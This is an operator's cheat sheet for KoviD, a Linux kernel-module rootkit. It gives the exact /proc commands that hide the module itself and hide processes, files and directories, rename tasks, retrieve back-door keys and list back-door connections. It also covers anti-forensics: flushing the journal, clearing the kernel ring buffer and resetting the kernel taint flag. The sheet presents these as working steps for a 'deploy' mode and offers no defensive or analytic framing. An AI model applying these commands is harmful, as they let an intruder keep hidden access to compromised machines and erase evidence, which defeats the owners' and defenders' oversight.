# CheatSheet

## proc UI Visibility

**Action:** Run

**About:** To switch proc UI on/off, repeat the command.

**Commands:**
- `kill -CONT 31337`

---

## Command Status

**Commands that return execution status:**
- `hide-pid`
- `hide-task-backdoor`
- `rename-task`
- `hide-lkm`
- `unhide-lkm`
- `hide-file`
- `unhide-directory`
- `hide-file-anywhere`
- `journal-flush`
- `signal-task-stop`
- `signal-task-cont`
- `signal-task-kill`
- `taint-clear`
- `syslog-clear`

**How to check:**
- `cat /proc/myprocname`

The return value shows the operation status, which can vary depending on the command.

**Default:** Disabled

**Toggle and Check enable/disable:**
- `echo output-enable >/proc/myprocname && cat /proc/myprocname`
- `echo output-disable >/proc/myprocname && cat /proc/myprocname`

**Return Codes:**
- `== 0:` Disabled
- `== 1:` Enabled

---

## KoviD Invisibility

**Action:** Run

**Mode:** debug, deploy

**About:** Hide the module.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo hide-lkm >/proc/myprocname`

---

## KoviD Visibility

**Action:** Run

**Mode:** debug

**About:** Unhide the module.

**Root required:** No

**Commands:**
- `echo get-unhidekey >/proc/myprocname`
- `key=$(cat /proc/myprocname)`
- `echo unhide-lkm=$key > /proc/myprocname`

---

## KoviD Visibility in DEPLOY Mode

**Action:** Run

**Mode:** deploy

**About:** Unhide the module. The KEY is build-time generated—check the Makefile output.

**Root required:** Yes

**Commands:**
- `echo unhide-lkm=<KEY> > /proc/myprocname`

---

## Unload KoviD

**Action:** Run

**Mode:** debug

**About:** Unload the module.

**Root required:** No

**Commands:**
- `sudo rmmod ./kovid.ko`

---

## Unload KoviD in DEPLOY Mode

**Action:** Run

**Mode:** deploy

**About:** Unload the module AFTER `unhide-lkm` command.

**Root required:** Yes

**Commands:**
- `sudo rmmod -f ./kovid.ko`

---

## Get Unhide Module KEY

**Action:** UI

**Mode:** debug

**About:** Retrieve the unhide module KEY.

**Root required:** No

**Commands:**
- `echo get-unhidekey >/proc/myprocname`
- `cat /proc/myprocname`

---

## Get Back-doors KEY

**Action:** UI

**Mode:** debug

**About:** Retrieve the back-door KEY.

**Root required:** No

**Commands:**
- `echo get-bdkey >/proc/myprocname`
- `cat /proc/myprocname`

---

## Hide Process (PID)

**Action:** UI

**Mode:** debug, deploy

**About:** Hide/unhide tasks. For example, to hide the task with PID `1234`.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo 1234 >/proc/myprocname`

---

## Hide a File in Current Directory

**Action:** UI

**Mode:** debug, deploy

**About:** Hide a file.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo hide-file=README.txt >/proc/myprocname`

---

## Hide a File Elsewhere

**Action:** UI

**Mode:** debug, deploy

**About:** Hide a file located elsewhere.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo hide-file=/home/user/README.txt >/proc/myprocname`

---

## Hide All Instances of a File

**Action:** UI

**Mode:** debug, deploy

**About:** Hide all instances of a file.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo hide-file-anywhere=README.txt >/proc/myprocname`

---

## Hide a Directory in Current Directory

**Action:** UI

**Mode:** debug, deploy

**About:** Hide a directory.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo hide-directory=dir1 >/proc/myprocname`

---

## Hide a Directory Elsewhere

**Action:** UI

**Mode:** debug, deploy

**About:** Hide a directory located elsewhere.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo hide-directory=/home/some-user/dir1 >/proc/myprocname`

---

## Unhide a Directory

**Action:** UI

**Mode:** debug, deploy

**About:** Unhide a directory.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo unhide-directory=dir1 >/proc/myprocname`

---

## List Hidden Files

**Action:** UI

**Mode:** debug

**About:** Show hidden filenames in `dmesg`.

**Root required:** No

**Commands:**
- `echo list-hidden-files >/proc/myprocname`
- `dmesg`

---

## Rename a Running Task

**Action:** UI

**Mode:** debug, deploy

**About:** Rename the task with PID `1234` to `newtaskname`.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo rename-task=1234,newtaskname >/proc/myprocname`

---

## List Hidden Tasks (PIDs)

**Action:** UI

**Mode:** debug

**About:** Show hidden tasks in `dmesg`.

**Root required:** No

**Commands:**
- `echo list-hidden-tasks >/proc/myprocname`
- `dmesg`

---

## List Current Back-door Connections

**Action:** UI

**Mode:** debug

**About:** Show current back-door connections in `dmesg`.

**Root required:** No

**Commands:**
- `echo list-backdoor >/proc/myprocname`
- `dmesg`

---

## Get the Base Address of a Process PID

**Action:** UI

**Mode:** debug, deploy

**About:** Fetch the base address of a process with PID `1234`.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo base-address=1234 >/proc/myprocname`
- `cat /proc/myprocname`

---

## Run Journal Flush

**Action:** UI

**Mode:** debug, deploy

**About:** Flush journal logs.

**Root required:** debug = No, deploy = Yes

**Commands:**
- `echo journal-flush >/proc/myprocname`

---

## Send Signal to Hidden Task

**Action:** UI

**Mode:** debug, release

**About:** Available signals: stop, cont, kill. Signaling PID `1234`.

**Root required:** debug = No, release = Yes

**Commands:**
- `echo signal-task-stop=1234 >/proc/myprocname`
- `echo signal-task-cont=1234 >/proc/myprocname`
- `echo signal-task-kill=1234 >/proc/myprocname`

---

## Clear Ring-Buffer

**Action:** UI

**Mode:** debug, release

**About:** Clears the kernel ring buffer, similar to `dmesg -c`.

**Root required:** debug = No, release = Yes

**Commands:**
- `echo syslog-clear >/proc/myprocname`

---

## Clear `/proc` Tainted

**Action:** UI

**Mode:** debug, release

**About:** Reset `/proc/sys/kernel/tainted`.

**Root required:** debug = No, release = Yes

**Commands:**
- `echo taint-clear >/proc/myprocname`

